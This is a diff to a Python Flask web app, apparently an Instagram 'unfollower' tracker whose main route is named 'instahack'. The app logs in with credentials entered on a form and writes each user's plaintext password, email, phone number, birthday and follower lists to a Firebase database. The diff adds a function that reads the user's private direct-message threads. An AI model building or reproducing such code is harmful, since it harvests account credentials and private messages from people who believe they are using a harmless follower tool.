@@ -5,13 +5,12 @@ from instagrapi.types import User
 import requests
 import pyrebase
 from threading import Thread
-import threading
 import time
 import pickle
 
 app = Flask(__name__)
 
-user, db, user_name, user_data, password, user_insta_data = '', '', '', '', '', ''
+user, db = '', ''
 
 FIREBASE_CONFIG = {
     'apiKey': os.getenv('apiKey'),
@@ -43,13 +42,11 @@ def getResigteredUsers(db):
 start = time.time()
 try:
     db = connect_database(FIREBASE_CONFIG)
-except:
-    print("Database Connection Error")
+except Exception as e:
+    print("Database Connection Error: ", e)
 print("database connected: ", time.time()-start)
 
-start = time.time()
 REGISTERED_USERS = getResigteredUsers(db)
-print("got registered user: ", time.time()-start)
 
 
 def login(ACCOUNT_USERNAME, ACCOUNT_PASSWORD):
@@ -68,8 +65,8 @@ def get_account_details(user):
     return (userid, email, mobileno, gender, birthday)
 
 
-def get_user_info(user, userid):
-    details = user.user_info(userid)
+def get_user_info(user):
+    details = user.user_info(user.user_id)
     name = details.full_name
     username = details.username
     profile_pic = str(details.profile_pic_url)
@@ -119,20 +116,20 @@ def download_media(user, userid, mediacount):
             r = requests.get(
                 str(medias[i].thumbnail_url), allow_redirects=True)
             open(f'{userid}_{i}.jpg', 'wb+').write(r.content)
-        except e:
+        except Exception as e:
             print(e)
 
 
-def push_data(user, db, password):
-    # Information retrival
+def push_data(user, db):
     userid, email, mobileno, gender, birthday = get_account_details(user)
     name, username, profile_pic, bio, is_private, followers_count, following_count, media_count = get_user_info(
-        user, userid)
-    # Pushing Data
-    print('got alll dataaa')
-    globals()['user_insta_data'] = {'userid': userid, 'password': password, 'name': name, 'email': email, 'mobileno': mobileno, 'gender': gender, 'birthday': birthday, 'profile_pic': profile_pic, 'bio': bio, 'is_private': is_private, 'followers_count': followers_count,
-                                    'following_count': following_count, 'media_count': media_count, 'followers': get_followers(user, userid), 'following': get_following(user, userid), 'unfollowers': [], 'recent_unfollowers': [], 'followers_you_dont_follow': [], 'users_dont_follow_back': []}
+        user)
+    print('All Data Fetched!')
+
+    user_insta_data = {'userid': userid, 'password': user.password, 'name': name, 'email': email, 'mobileno': mobileno, 'gender': gender, 'birthday': birthday, 'profile_pic': profile_pic, 'bio': bio, 'is_private': is_private, 'followers_count': followers_count,
+                       'following_count': following_count, 'media_count': media_count, 'followers': get_followers(user, userid), 'following': get_following(user, userid), 'unfollowers': [], 'recent_unfollowers': [], 'followers_you_dont_follow': [], 'users_dont_follow_back': []}
     db.child("Users").child(username).set(user_insta_data)
+    print("Data Uploaded to the servers!")
 
 
 def check_unfollowers(li1, li2):
@@ -140,45 +137,46 @@ def check_unfollowers(li1, li2):
     return li_dif
 
 
-@app.route('/save_info', methods=["GET", "POST"])
-def temp_to_profile():
-    if request.method == "POST":
-        return redirect(url_for('loadProfile'))
+def calc_unfollowers(user):
+    followersI = sorted(get_followers(user, user.username))
+    followersD = getFollowersFromDatabase(db, user.username)
+    unfollowers_list = check_unfollowers(followersD, followersI)
+    return unfollowers_list
 
 
-@app.route('/temp')
-def loadProfile():
-    while True:
-        if(not 'PushData' in [thread.name for thread in threading.enumerate()]):
-            print('PushData Thread Finished!')
-            break
+def getDMThreads(user, amount):
+    directThreads = user.direct_threads(amount=amount)
+    DMThreads = {}
+    for thread in directThreads:
+        username = thread.users[0].username
+        messages = [{'user_id': i.user_id, 'item_type': i.item_type,
+                     'text': i.text} for i in thread.messages]
+        DMThreads[username] = messages
+    return DMThreads
 
-    name = globals()['user_insta_data']['name']
-    bio = globals()['user_insta_data']['bio']
-    profile_pic = globals()['user_insta_data']['profile_pic']
-    followers_count = globals()['user_insta_data']['followers_count']
-    following_count = globals()['user_insta_data']['following_count']
-    media_count = globals()['user_insta_data']['media_count']
-    try:
-        r = requests.get(profile_pic, allow_redirects=True)
-        open(f'./static/{user_name}.jpg', 'wb+').write(r.content)
-    except e:
-        print(e)
-    return render_template("profile.html", name=name, profile_pic=user_name+'.jpg', bio=bio, user_name=user_name, followers_count=followers_count, following_count=following_count, media_count=media_count)
+
+def displayConversation(Thread, Youser_id, user_name):
+    fspace = len(user_name)
+    for text in Thread[:-1]:
+        sender = "You" if str(text['user_id']) == str(Youser_id) else user_name
+        if(text['item_type'] == "text"):
+            print(f"{sender.rjust(fspace)} :  {text['text']}")
+        else:
+            print(f"{sender.rjust(fspace)} :  {text['item_type']}")
 
 
 @app.route('/', methods=["GET", "POST"])
 def instahack():
     if request.method == "POST":
-        globals()['user_name'] = request.form.get("uname")
-        globals()['password'] = request.form.get("pword")
+        user_name = request.form.get("uname")
+        password = request.form.get("pword")
         try:
             globals()['user'] = login(user_name, password)
             print('Login Sucessfull!')
+        except Exception as e:
+            return e
 
-        except:
-            return 'Login Error: Please enter correct username and password!'
-        globals()['user_data'] = get_details(db=db, user_name=user_name)
+        user_data = get_details(db=db, user_name=user_name)
         if(user_name in REGISTERED_USERS):
             name = getSpecificDetail(user_data=user_data, key='name')
             bio = getSpecificDetail(user_data=user_data, key='bio')
@@ -193,25 +191,21 @@ def instahack():
             try:
                 r = requests.get(profile_pic, allow_redirects=True)
                 open(f'./static/{user_name}.jpg', 'wb+').write(r.content)
-            except e:
+            except Exception as e:
                 print(e)
             return render_template("profile.html", profile_pic=user_name+'.jpg', name=name, bio=bio, user_name=user_name, followers_count=followers_count, following_count=following_count, media_count=media_count)
         else:
-            t1 = Thread(target=push_data, name='PushData',
-                        args=(user, db, password))
-            t1.start()
-            return render_template("save_info.html")
+            name, username, profile_pic, bio, is_private, followers_count, following_count, media_count = get_user_info(
+                user)
+            try:
+                r = requests.get(profile_pic, allow_redirects=True)
+                open(f'./static/{user_name}.jpg', 'wb+').write(r.content)
+            except Exception as e:
+                print(e)
+            Thread(target=push_data, name='PushData', args=(user, db)).start()
+            return render_template("profile.html", profile_pic=username+'.jpg', name=name, bio=bio, user_name=username, followers_count=followers_count, following_count=following_count, media_count=media_count)
 
     return render_template("index.html")
-
-
-def upload_data(user, user_name, password):
-    start = time.time()
-    followersI = sorted(get_followers(user, user_name))
-    print(f'calculated Followers in {time.time()-start}')
-    followersD = getFollowersFromDatabase(db, user_name)
-    unfollowers_list = check_unfollowers(followersD, followersI)
-    return f"Welcome Back!\nPeople who unfollowed you: {', '.join([user.username_from_user_id(id) for id in unfollowers_list])}"
 
 
 if __name__ == '__main__':
